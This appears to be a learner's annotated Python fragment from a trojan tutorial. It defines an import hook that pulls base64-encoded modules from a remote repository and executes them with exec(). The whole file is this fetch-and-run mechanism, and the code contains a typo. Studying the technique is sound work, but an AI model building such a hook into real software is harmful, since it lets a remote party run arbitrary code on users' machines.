#time to make a class - the below will ensure that once we make a module available
#it will also be available to all subsequent module we pull in.

################################################################################
#this code will be added to the sys.meta_path list - so when the path is searched
#and the required module is not there, our program will go and pull it in
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

#the find_module will be called in first to see if we can locate the missing module
#in our repo first        
    def find_module(self,fullname,path=None):
        if configured:
            print ("[*] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fulname))
#we base64 decode the code and store it in our class
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
            
                return self
#by returning self we tell python that we found some code and it can call load_module
#function to load it - achieved by call native imp module to load a blank module and feed
#our located code into it. After this we need to inject our pieced together module into
#the sys.modules [[RESEARCH sys.modules]] list so that it can be reused for any future
#import calls
            
        return None

    def load_module(self,name):

        module = imp.new_module(name)
        exec (self.current_module_code) in module.__dict__
        sys.modules[name] = module

        return module

#notes on what is going on here:
    #We define the objects called by class, the objects will work in tandem to locate/create
    #missing modules
    #class will be called when module is not found
    #
    #
